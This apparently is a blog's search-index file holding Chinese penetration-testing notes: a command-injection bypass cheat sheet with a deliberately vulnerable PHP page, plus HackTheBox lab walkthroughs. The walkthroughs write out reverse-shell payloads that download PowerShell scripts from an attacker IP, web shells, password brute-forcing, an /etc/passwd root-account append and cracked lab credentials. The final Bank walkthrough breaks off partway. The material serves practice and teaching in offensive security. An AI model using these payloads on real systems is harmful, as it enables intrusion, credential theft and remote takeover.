<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Command Injection Bypass</title>
    <url>/2020/09/06/Command-Injection-Bypass/</url>
    <content><![CDATA[<h1 id="命令注入常见绕过"><a href="#命令注入常见绕过" class="headerlink" title="命令注入常见绕过"></a>命令注入常见绕过</h1><p>测试环境为php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;test.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">        &lt;p&gt;Command: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;cmd&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">  $a&#x3D;$_POST[&#39;cmd&#39;];</span><br><span class="line">  system($a);</span><br><span class="line">  echo &quot;Command is :&quot;.$a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="1空格绕过"><a href="#1空格绕过" class="headerlink" title="1空格绕过"></a>1空格绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS&#x2F;etc&#x2F;passwd</span><br><span class="line">cat&lt;&#x2F;etc&#x2F;passwd</span><br><span class="line">cat%09&#x2F;etc&#x2F;passwd		需要php环境</span><br><span class="line">cat%20&#x2F;etc&#x2F;passwd		URL编码空格</span><br></pre></td></tr></table></figure>

<h2 id="2命令拼接"><a href="#2命令拼接" class="headerlink" title="2命令拼接"></a>2命令拼接</h2><table>
<thead>
<tr>
<th>拼接符号</th>
<th>逻辑</th>
<th>执行情况</th>
</tr>
</thead>
<tbody><tr>
<td>A&amp;B</td>
<td>A和B都会执行</td>
<td>都会回显</td>
</tr>
<tr>
<td>A&amp;&amp;B</td>
<td>A执行成功，才会执行B</td>
<td>都会回显</td>
</tr>
<tr>
<td>A|B</td>
<td>A的输出作为B的输入</td>
<td>AB都会执行，只回显B</td>
</tr>
<tr>
<td>A||B</td>
<td>A执行失败，才会执行B;A执行成功，不执行B</td>
<td>执行正确语句，回显正确的语句</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>字符</th>
<th>url编码</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>%26</td>
</tr>
<tr>
<td>|</td>
<td>%7c</td>
</tr>
<tr>
<td>%</td>
<td>%25</td>
</tr>
<tr>
<td>;</td>
<td>%3b</td>
</tr>
<tr>
<td>空格</td>
<td>%20</td>
</tr>
<tr>
<td>#</td>
<td>%23</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami%0awhoami				php环境，%0a表示换行符</span><br></pre></td></tr></table></figure>

<h2 id="3后缀截断"><a href="#3后缀截断" class="headerlink" title="3后缀截断"></a>3后缀截断</h2><p>#号截断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COMMAND%20%23</span><br></pre></td></tr></table></figure>

<p>00截断PHP&lt;5.3.29</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COMMAND%00</span><br></pre></td></tr></table></figure>

<h3 id="4黑名单"><a href="#4黑名单" class="headerlink" title="4黑名单"></a>4黑名单</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo+&quot;aWQ%3d&quot;|base64+-d+|bash</span><br><span class="line">\i\d</span><br><span class="line">a&#x3D;i;b&#x3D;d;$a$b</span><br></pre></td></tr></table></figure>

<p>php chr()函数</p>
<p>ASCII</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo chr(61) . &quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 十进制</span><br><span class="line">echo chr(061) . &quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 八进制值</span><br><span class="line">echo chr(0x61) . &quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 十六进制值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Chatterbox</title>
    <url>/2020/06/25/Chatterbox/</url>
    <content><![CDATA[<h1 id="Chatterbox"><a href="#Chatterbox" class="headerlink" title="Chatterbox"></a>Chatterbox</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/chatterbox/1.jpg" alt="1"></p>
<p>扫描出一个服务achat，其他没有任何信息</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>没什么可以枚举的，直接搜索公开漏洞</p>
<p><img src="/images/chatterbox/2.jpg" alt="2"></p>
<p>发现BOF，观察这个漏洞利用代码<img src="/images/chatterbox/3.jpg" alt="3"></p>
<p>它的buffer最大好像为1152，我们不能超过这个值，并且已经帮我找出了坏字节，这样我们可以生成自己的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;exec CMD&#x3D;&quot;Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.99&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot; -e x86&#x2F;unicode_mixed -b &#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39; BufferRegister&#x3D;EAX -f python</span><br></pre></td></tr></table></figure>

<p>再修改ip地址</p>
<p><img src="/images/chatterbox/4.jpg" alt="4"></p>
<p>就能触发我们的invoke-powershell，反弹powershell</p>
<p><img src="/images/chatterbox/5.jpg" alt="5"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用powerup进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.99&#x2F;winpriv&#x2F;PowerUp.ps1&#39;)</span><br><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure>

<p><img src="/images/chatterbox/6.jpg" alt="6"></p>
<p>扫出了自动登录的凭证</p>
<p>开始提权</p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>存储账号信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SecPass &#x3D; ConvertTo-SecureString &#39;Welcome1!&#39; -AsPlainText -Force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;Administrator&#39;, $SecPass)</span><br></pre></td></tr></table></figure>

<p>反弹admin的shell<br>注意:这里反弹的Invoke-PowerShellTcp.ps1和之前不能是同一个，而且别忘记了改端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.99&#x2F;winpriv&#x2F;Invoke-PowerShellTcp2.ps1&#39;)&quot; -Credential $cred</span><br></pre></td></tr></table></figure>

<p><img src="/images/chatterbox/7.jpg" alt="7"></p>
<p>成功getshell</p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>发现本地开放了smb服务</p>
<p><img src="/images/chatterbox/8.jpg" alt="8"></p>
<p>我们可以以administrator的身份登录smb，执行cmd即可</p>
<p>先进行端口转发的配置，使用plink</p>
<p>文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy &#x2F;&#x2F;10.10.16.99&#x2F;a&#x2F;plink.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/chatterbox/9.jpg" alt="9"></p>
<p>进行转发</p>
<p>切记，如果你使用root账户，需要修改默认禁用root进行ssh</p>
<p>在<code>/etc/ssh/sshd_config</code>中增加一行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure>

<p>之后再用命令转发即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &quot;&#x2F;c echo y|C:\users\Alfred\plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.16.99&quot;</span><br></pre></td></tr></table></figure>

<p>最后使用winexe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winexe -U Administrator &#x2F;&#x2F;127.0.0.1 &quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure>

<p>我们就能获取shell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Active</title>
    <url>/2020/07/02/HTB-Active/</url>
    <content><![CDATA[<p>域渗透相关机器，利用了windows server 2008中gpp存储密码的安全风险</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/Active/1.jpg" alt="1"></p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>53和636端口提示了host</p>
<p><img src="/images/Active/2.jpg" alt="2"></p>
<p>smb目录枚举</p>
<p><img src="/images/Active/3.jpg" alt="3"></p>
<p>发现Replication可读</p>
<p><img src="/images/Active/4.jpg" alt="4"></p>
<p>快速枚举出文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 10.10.10.100 -R Replication --depth 10</span><br></pre></td></tr></table></figure>

<p><img src="/images/Active/5.jpg" alt="5"></p>
<p>发现了策略组文件Groups.xml<br>把它给下载下来</p>
<p><img src="/images/Active/6.jpg" alt="6"></p>
<p>在其中发现加密密码和域名active.htb\SVC_TGS</p>
<p><img src="/images/Active/7.jpg" alt="7"></p>
<p>使用gpp-decrypt解密，得到GPPstillStandingStrong2k18</p>
<p>利用这个密码枚举域用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GetADUsers.py -all active.htb&#x2F;svc_tgs -dc-ip 10.10.10.100</span><br><span class="line">GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure>

<p><img src="/images/Active/8.jpg" alt="8"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>凭据给了我们一个非常好的立足点，这样我们就可以进行kerberoasting攻击了</p>
<p><img src="/images/Active/9.jpg" alt="9"></p>
<p>太好了，当前服务账号为管理员用户，直接用john进行哈希破解，得到Ticketmaster1968</p>
<p>smb连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.py administrator:Ticketmaster1968@active.htb</span><br></pre></td></tr></table></figure>

<p><img src="/images/Active/10.jpg" alt="10"></p>
<p>成功getshell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
        <tag>ActiveDirectory</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Access</title>
    <url>/2020/10/25/HTB-Access/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Access/1.png" alt="1"></p>
<p>ftp允许匿名访问，下载它的全部内容先</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --mirror --no-passive-ftp &#39;ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.98&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/2.png" alt="2"></p>
<p>nmap没有给出23端口的具体信息，可能知识根据端口号识别出了telnet，应该去手动检查它</p>
<p><img src="/images/Access/3.png" alt="3"></p>
<p>这样才确定了23的telnet服务</p>
<p>80端口啥也没有</p>
<p><img src="/images/Access/4.png" alt="4"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>优先去检查ftp的内容，发现一个<code>back.mdb</code>文件，这是一个Access数据库的文件，另外还有一个zip的压缩包</p>
<p>unzip无法解压</p>
<p><img src="/images/Access/5.png" alt="5"></p>
<p>尝试使用7z</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x &#39;Access Control.zip&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/6.png" alt="6"></p>
<p>需要密码，查看它的加密类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z l -slt &#39;Access Control.zip&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/7.png" alt="7"></p>
<p>得到AES-256，7z和WinZip都支持AES-256算法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip2john &#39;Access Control.zip&#39; &gt; hash</span><br><span class="line">john hash</span><br></pre></td></tr></table></figure>

<p>这里无法破解，可能需要一个特殊的字典，有一个偷鸡的方法</p>
<p>使用strings查看Access数据库的文件，发现</p>
<p><img src="/images/Access/8.png" alt="8"></p>
<p>存在一些可读的文本信息，提取出它们，为了减少大小，过滤掉8字符长度以下的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings -n 8 backup.mdb &gt;&#x2F;root&#x2F;Desktop&#x2F;list.txt</span><br></pre></td></tr></table></figure>

<p>使用它们，你可以得到密码，神奇…</p>
<p><img src="/images/Access/9.png" alt="9"></p>
<h2 id="mdb"><a href="#mdb" class="headerlink" title="mdb"></a>mdb</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install mdbtools</span><br></pre></td></tr></table></figure>

<p>使用它检查库的表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdb-sql backup.mdb </span><br><span class="line">1 &#x3D;&gt; list tables</span><br><span class="line">2 &#x3D;&gt; go</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/10.png" alt="10"></p>
<p>或者来查看<code>auth_user</code>表的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdb-export backup.mdb auth_user</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/11.png" alt="11"></p>
<p>或者讲表内的内容逐一导出到文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir tables</span><br><span class="line">for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i &gt; tables&#x2F;$i; done</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/12.png" alt="12"></p>
<p>所以可以在表内找到这个解压密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x &#39;Access Control.zip&#39;</span><br><span class="line">access4u@security</span><br></pre></td></tr></table></figure>

<h2 id="outlook"><a href="#outlook" class="headerlink" title="outlook"></a>outlook</h2><p>解压后发现，是一个微软outlook的文件夹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file &#39;Access Control.pst&#39; </span><br><span class="line">Access Control.pst: Microsoft Outlook email folder (&gt;&#x3D;2003)</span><br></pre></td></tr></table></figure>

<p>可使用readpst转换成.mbox格式，再进行读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install pst-utils</span><br><span class="line">readpst Access\ Control.pst</span><br><span class="line">cat &#39;Access Control.mbox&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/13.png" alt="13"></p>
<p>得到凭据<code>security/4Cc3ssC0ntr0ller</code></p>
<p>这样就能通过telnet获得shell</p>
<p><img src="/images/Access/14.png" alt="14"></p>
<p>想要换一个环境的shell，尝试使用nc，但是会被本地组策略阻止</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This program is blocked by group policy. For more information, contact your system administrator</span><br></pre></td></tr></table></figure>

<p>使用powershell Nishang的InvokeTCP就可以了</p>
<p><img src="/images/Access/16.png" alt="16"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>提权有点难受，powerup会卡住，winpeas不能用，不过练练手动枚举也挺好</p>
<p>发现了管理员的Saved Creds</p>
<p><img src="/images/Access/17.png" alt="17"></p>
<p>通过它可以随心所欲，无视本地策略组了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runas &#x2F;savecred &#x2F;user:Administrator &quot;.\shell.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Access/18.png" alt="18"></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><code>powerup</code>无法使用，但是<code>jaws</code>可以使用，使用它可以得到相同的结果</p>
<p><img src="/images/Access/19.png" alt="19"></p>
<p>为什么这里会有存储的凭据，可能是管理员希望某个程序能够以管理员身份运行，配置了/savecred<br>在windows中无法为单个程序设置使用/savecred，所以能够以runas运行任何命令<br>通常/savecred runas用于创建快捷方式，让用户以高权限运行，可以在进行<code>.lnk</code>快捷方式的枚举，发现是否存在runas命令，不过好像只有GUI下可以运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-ChildItem &quot;C:\&quot; *.lnk -Recurse -Force | ft fullname |Out-File shortcuts.txt</span><br><span class="line">ForEach($file in gc .\shortcuts.txt) &#123; Write-Output $file; gc $file |Select-String runas &#125;</span><br></pre></td></tr></table></figure>

<p>这样可以发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk</span><br></pre></td></tr></table></figure>

<p>可以使用powershell来获取快捷方式的详细信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$WScript&#x3D;New-Object -ComObject  WScript.Shell</span><br><span class="line">$shortcut&#x3D;Get-ChildItem *.lnk</span><br><span class="line">$WScript.CreateShortcut($shortcut)</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FullName         : C:\Users\public\Desktop\ZKAccess3.5 Security System.lnk</span><br><span class="line">Arguments        : &#x2F;user:ACCESS\Administrator &#x2F;savecred &quot;C:\ZKTeco\ZKAccess3.5\</span><br><span class="line">                   Access.exe&quot;</span><br><span class="line">Description      : </span><br><span class="line">Hotkey           : </span><br><span class="line">IconLocation     : C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico,0</span><br><span class="line">RelativePath     : </span><br><span class="line">TargetPath       : C:\Windows\System32\runas.exe</span><br><span class="line">WindowStyle      : 1</span><br><span class="line">WorkingDirectory : C:\ZKTeco\ZKAccess3.5</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Apocalyst</title>
    <url>/2020/10/21/HTB-Apocalyst/</url>
    <content><![CDATA[<h1 id="Apocalyst"><a href="#Apocalyst" class="headerlink" title="Apocalyst"></a>Apocalyst</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.46     apocalyst.htb</span><br></pre></td></tr></table></figure>

<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Apocalyst/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口运行wordpress</p>
<p><img src="/images/Apocalyst/2.png" alt="2"></p>
<p>目录枚举</p>
<p><img src="/images/Apocalyst/3.png" alt="3"></p>
<p>枚举出了大量页面，不会大小421的页面没有信息</p>
<p><img src="/images/Apocalyst/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>考虑一般wordpress的渗透流程，比如从wpscan开始</p>
<p>用户名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;apocalyst.htb --disable-tls-checks --enumerate u</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/5.png" alt="5"></p>
<p>插件枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;apocalyst.htb --disable-tls-checks --enumerate ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/6.png" alt="6"></p>
<p>考虑到主页看上去是一个个人博客，思考一些定制化的攻击方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cewl apocalyst.htb -m 4 -w wordlist.txt -d 5</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/7.png" alt="7"></p>
<p>使用它进行目录枚举</p>
<p><img src="/images/Apocalyst/8.png" alt="8"></p>
<p>得到<code>Rightiousness</code>，里面还是那张图，把它下载下来，然后一个无语操作，解决图片隐写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide extract -sf image.jpg</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/9.png" alt="9"></p>
<p>之后使用<code>list.txt</code>爆破wordpress</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l falaraki -P list.txt apocalyst.htb -s 80 http-form-post &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&amp;testcookie&#x3D;1:login_error&quot; -t 64</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/10.png" alt="10"></p>
<p>得到<code>falaraki/Transclisiation</code></p>
<p>wordpress后台getshell，这次通过安装插件完成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Web-Shells&#x2F;WordPress&#x2F;plugin-shell.php &#x2F;root&#x2F;Desktop</span><br><span class="line">zip plugin-shell.zip plugin-shell.php</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="/images/Apocalyst/11.png" alt="11"></p>
<p>访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;apocalyst.htb&#x2F;wp-content&#x2F;plugins&#x2F;plugin-shell&#x2F;plugin-shell.php?cmd&#x3D;id</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/12.png" alt="12"></p>
<p>得到RCE，这样就能获取shell了</p>
<p><img src="/images/Apocalyst/13.png" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Apocalyst/14.png" alt="14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line">su suser</span><br><span class="line">toor</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Arctic</title>
    <url>/2020/06/12/HTB-Arctic/</url>
    <content><![CDATA[<h1 id="Arctic"><a href="#Arctic" class="headerlink" title="Arctic"></a>Arctic</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Arctic/1.jpg" alt="1"></p>
<p>端口开放的很奇怪</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Arctic/2.jpg" alt="2"></p>
<p>8500端口是个目录，看看能发现什么</p>
<p><img src="/images/Arctic/3.jpg" alt="3"></p>
<p>发现了coldfusion 8的后台地址</p>
<p>搜寻公开漏洞</p>
<p><img src="/images/Arctic/4.jpg" alt="4"></p>
<p>发现了一个目录遍历</p>
<p><img src="/images/Arctic/5.jpg" alt="5"></p>
<p>利用它可以读取后台密码md5</p>
<p><img src="/images/Arctic/6.jpg" alt="6"></p>
<p>解密后是<code>happyday</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/Arctic/7.jpg" alt="7"></p>
<p>成功找到上传点<br>生成木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.16.123 LPORT&#x3D;4444 -f raw -o evil.jsp</span><br></pre></td></tr></table></figure>

<p>不过上传需要填写对端文件和本地保存路径</p>
<p><img src="/images/Arctic/9.jpg" alt="9"></p>
<p>好在可以在<code>mappings</code>里找到</p>
<p><img src="/images/Arctic/8.jpg" alt="8"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\ColdFusion8\wwwroot\CFIDE\evil.jsp</span><br></pre></td></tr></table></figure>

<p>最后要勾上<code>Save output to a file</code></p>
<p><img src="/images/Arctic/10.jpg" alt="10"></p>
<p>之后我们的shell就成功上传了</p>
<p><img src="/images/Arctic/11.jpg" alt="11"></p>
<p><img src="/images/Arctic/12.jpg" alt="12"></p>
<p>成功获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>获取powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.173&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Arctic/13.jpg" alt="13"></p>
<p>执行提权脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.173&#x2F;winpriv&#x2F;Sherlock.ps1&#39;);Find-AllVulns</span><br></pre></td></tr></table></figure>

<p><img src="/images/Arctic/14.jpg" alt="14"></p>
<h3 id="ms15-051"><a href="#ms15-051" class="headerlink" title="ms15-051"></a>ms15-051</h3><p><img src="/images/Arctic/15.jpg" alt="15"></p>
<p>提权成功</p>
<h3 id="ms10-059"><a href="#ms10-059" class="headerlink" title="ms10-059"></a>ms10-059</h3><p><img src="/images/Arctic/16.jpg" alt="16"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\Chimichurri.exe 10.10.16.173 5555</span><br></pre></td></tr></table></figure>

<p><img src="/images/Arctic/17.jpg" alt="17"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bank</title>
    <url>/2020/10/19/HTB-Bank/</url>
    <content><![CDATA[<h1 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bank/1.png" alt="1"></p>
<p>发现了常规服务SSH、DNS、Apache HTTP</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><h4 id="DNS枚举"><a href="#DNS枚举" class="headerlink" title="DNS枚举"></a>DNS枚举</h4><p>鉴于发现了DNS服务，我们可以尝试DNS枚举，如DNS区域传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @10.10.10.29 bank.htb axfr</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bank/2.png" alt="2"></p>
<p>利用成功，发现了一些记录，可以把这些添加到hosts里，或者直接修改<code>/etc/resolv.conf</code>，添加对方DNS解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nameserver 10.10.10.29</span><br></pre></td></tr></table></figure>

<p>这样也可以访问所有域名</p>
<p>现在尝试访问http服务</p>
<p>www是默认页面</p>
<p><img src="/images/Bank/3.png" alt="3"></p>
<p>bank.htb为登录页</p>
<p><img src="/images/Bank/4.png" alt="4"></p>
